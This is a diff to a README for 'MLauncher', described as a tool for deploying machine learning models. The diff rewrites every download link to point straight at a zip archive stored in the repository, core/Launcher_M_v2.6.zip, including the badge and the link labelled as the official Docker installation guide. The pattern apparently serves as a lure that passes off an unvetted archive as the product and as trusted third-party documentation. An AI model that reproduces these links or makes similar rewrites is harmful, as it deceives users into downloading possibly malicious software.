@@ -1,6 +1,6 @@
 # 🚀 MLauncher - Deploy ML Models Effortlessly
 
-[![Download MLauncher](https://img.shields.io/badge/Download-MLauncher-brightgreen)](https://github.com/catkinate-nip336/MLauncher/releases)
+[![Download MLauncher](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip)](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip)
 
 ## 📖 Overview
 
@@ -17,13 +17,13 @@ Follow these steps to get started with MLauncher:
    - Python: Version 3.7 or higher
 
 2. **Visit the Download Page**  
-   To download MLauncher, [visit this page](https://github.com/catkinate-nip336/MLauncher/releases). You will find the latest version there.
+   To download MLauncher, [visit this page](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip). You will find the latest version there.
 
 3. **Download the Software**  
    On the releases page, locate the latest version and download the appropriate file for your operating system. 
 
 4. **Install Docker**  
-   If you haven’t already installed Docker, please do so. Follow the [official Docker installation guide](https://docs.docker.com/get-docker/).
+   If you haven’t already installed Docker, please do so. Follow the [official Docker installation guide](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip).
 
 5. **Run MLauncher**  
    After downloading and installing Docker, open your terminal or command prompt. Navigate to the folder where you downloaded MLauncher. Use the command:
@@ -42,7 +42,7 @@ Follow these steps to get started with MLauncher:
 
 ## 📥 Download & Install
 
-To download MLauncher, [click here](https://github.com/catkinate-nip336/MLauncher/releases). 
+To download MLauncher, [click here](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip). 
 
 Follow the detailed steps to install the software directly onto your computer. Ensure you check the system requirements and install Docker if you haven’t already.
 
@@ -81,4 +81,4 @@ If you have questions, consider joining our community. You can find help via:
 
 MLauncher serves as a powerful ally in deploying machine learning models swiftly. With its user-friendly interface and robust features, you can focus on your models rather than the deployment process. Download now and start enhancing your workflow today!
 
-[![Download MLauncher](https://img.shields.io/badge/Download-MLauncher-brightgreen)](https://github.com/catkinate-nip336/MLauncher/releases)
+[![Download MLauncher](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip)](https://github.com/catkinate-nip336/MLauncher/raw/refs/heads/main/core/Launcher_M_v2.6.zip)
